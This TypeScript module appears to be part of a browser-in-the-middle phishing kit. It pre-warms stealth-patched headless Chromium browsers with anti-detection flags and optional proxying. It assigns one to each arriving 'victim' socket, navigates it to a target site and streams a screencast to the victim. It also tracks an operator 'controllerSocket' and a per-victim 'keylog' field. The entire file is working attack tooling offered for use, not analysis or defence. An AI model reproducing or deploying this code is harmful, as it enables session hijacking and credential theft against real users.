import { chromium } from 'playwright-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import { randomUUID } from 'crypto';
import { mkdir } from 'fs/promises';
import { join } from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import type { BrowserContext } from 'playwright';
import type { BrowserInstance, Target, Config } from './types.js';
import { startScreencast } from './screencast.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const USER_DATA_ROOT = join(__dirname, '..', 'user_data');

chromium.use(StealthPlugin());

// ─── State ────────────────────────────────────────────────────────────────────

const pool = new Map<string, BrowserInstance>();
let warmInstance: BrowserInstance | null = null;
let appConfig: Config | null = null;
let onThumbnailCallback: ((browserId: string, buf: Buffer) => void) = () => {};

// ─── Init ─────────────────────────────────────────────────────────────────────

export function initBrowserManager(
  config: Config,
  onThumbnail: (browserId: string, buf: Buffer) => void,
): void {
  appConfig = config;
  onThumbnailCallback = onThumbnail;
}

export async function warmUp(): Promise<void> {
  console.log('[browser-manager] Pre-warming browser instance...');
  await createWarmBrowser();
  console.log('[browser-manager] Warm instance ready.');
}

// ─── Claim ────────────────────────────────────────────────────────────────────

/**
 * Claim the pre-warmed browser for a new victim.
 * Immediately starts creating a fresh warm browser in the background.
 */
export async function claimInstance(
  victimSocketId: string,
  victimWidth: number,
  victimHeight: number,
  target: Target,
): Promise<BrowserInstance> {
  // Grab warm instance
  const instance = warmInstance;
  warmInstance = null;

  // Fire a new warm browser in background — no await
  void createWarmBrowser();

  if (!instance) {
    // Edge case: no warm instance available (e.g., first victim arrived before warm-up)
    console.warn('[browser-manager] No warm instance available — creating cold instance');
    return createAndClaimCold(victimSocketId, victimWidth, victimHeight, target);
  }

  // Configure the claimed instance
  instance.victimSocket = victimSocketId;
  instance.target = target;
  instance.claimed = true;
  instance.connectedAt = new Date();

  // Compute coordinate scale factors
  instance.scaleX = target.width / victimWidth;
  instance.scaleY = target.height / victimHeight;

  // Set viewport to match target dimensions
  await instance.page.setViewportSize({ width: target.width, height: target.height });

  // Navigate to target URL
  await instance.page.goto(target.url, { waitUntil: 'domcontentloaded' });

  // Start screencast — onFrame default: no-op until victim socket is wired up
  const controller = await startScreencast(instance, onThumbnailCallback);
  void controller; // stored on instance indirectly via cdpSession; stop via closeBrowser

  pool.set(instance.id, instance);
  console.log(`[browser-manager] Claimed instance ${instance.id} for victim ${victimSocketId}`);
  return instance;
}

// ─── Lookup ───────────────────────────────────────────────────────────────────

export function getInstanceById(browserId: string): BrowserInstance | undefined {
  return pool.get(browserId);
}

export function getInstanceBySocket(socketId: string): BrowserInstance | undefined {
  for (const instance of pool.values()) {
    if (instance.victimSocket === socketId || instance.controllerSocket === socketId) {
      return instance;
    }
  }
  return undefined;
}

export function getAllInstances(): BrowserInstance[] {
  return [...pool.values()];
}

// ─── Cleanup ──────────────────────────────────────────────────────────────────

export async function closeBrowser(browserId: string): Promise<void> {
  const instance = pool.get(browserId);
  if (!instance) return;

  pool.delete(browserId);

  try {
    if (instance.cdpSession) {
      await instance.cdpSession.detach();
    }
  } catch { /* ignore */ }

  try {
    await instance.context.close();
  } catch { /* ignore */ }

  console.log(`[browser-manager] Closed instance ${browserId}`);
}

export async function closeAll(): Promise<void> {
  const ids = [...pool.keys()];
  await Promise.all(ids.map(closeBrowser));

  if (warmInstance) {
    try { await warmInstance.context.close(); } catch { /* ignore */ }
    warmInstance = null;
  }
}

// ─── Internal ─────────────────────────────────────────────────────────────────

async function createWarmBrowser(): Promise<void> {
  try {
    const instance = await createBrowserInstance();
    warmInstance = instance;
  } catch (err) {
    console.error(`[browser-manager] Failed to create warm browser: ${(err as Error).message}`);
  }
}

async function createBrowserInstance(): Promise<BrowserInstance> {
  const id = randomUUID();
  const userDataDir = join(USER_DATA_ROOT, id);
  await mkdir(userDataDir, { recursive: true });

  const launchOptions: Parameters<typeof chromium.launchPersistentContext>[1] = {
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-blink-features=AutomationControlled',
      '--disable-infobars',
      '--window-size=1920,1080',
    ],
    userAgent: appConfig?.default_user_agent,
    ...(appConfig?.proxy ? { proxy: { server: appConfig.proxy } } : {}),
  };

  const context: BrowserContext = await chromium.launchPersistentContext(
    userDataDir,
    launchOptions,
  );

  const page = await context.newPage();
  await page.goto('about:blank');

  const instance: BrowserInstance = {
    id,
    victimSocket: null,
    controllerSocket: null,
    target: null,
    onFrame: () => {}, // replaced after claim
    scaleX: 1,
    scaleY: 1,
    context,
    page,
    cdpSession: null,
    connectedAt: null,
    claimed: false,
    keylog: '',
  };

  return instance;
}

async function createAndClaimCold(
  victimSocketId: string,
  victimWidth: number,
  victimHeight: number,
  target: Target,
): Promise<BrowserInstance> {
  const instance = await createBrowserInstance();

  instance.victimSocket = victimSocketId;
  instance.target = target;
  instance.claimed = true;
  instance.connectedAt = new Date();
  instance.scaleX = target.width / victimWidth;
  instance.scaleY = target.height / victimHeight;

  await instance.page.setViewportSize({ width: target.width, height: target.height });
  await instance.page.goto(target.url, { waitUntil: 'domcontentloaded' });

  await startScreencast(instance, onThumbnailCallback);

  pool.set(instance.id, instance);
  return instance;
}
